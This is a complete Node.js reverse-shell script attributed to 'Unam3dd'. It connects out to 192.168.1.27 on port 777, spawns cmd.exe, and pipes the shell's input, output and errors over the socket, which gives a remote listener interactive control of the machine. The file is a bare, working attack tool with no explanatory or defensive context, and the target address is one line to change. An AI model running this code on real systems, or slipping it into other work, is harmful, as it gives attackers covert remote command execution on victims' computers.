//Author : Unam3dd
// Basic Reverse Shell in JavaScript
const net = require("net");
const { exit } = require("process");

class ReverseShell{
    constructor(host,port,process)
    {
        this.exec(host,port,process);
        return 0;
    }

    exec(host,port,process)
    {
        const client = net.createConnection({host: host, port: port}, () => {
            var sh = require("child_process").exec(process);
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
            
            client.on('end', () => {
                exit(0);
            });
        });
    }
};

rshell = new ReverseShell("192.168.1.27",777,"cmd.exe");
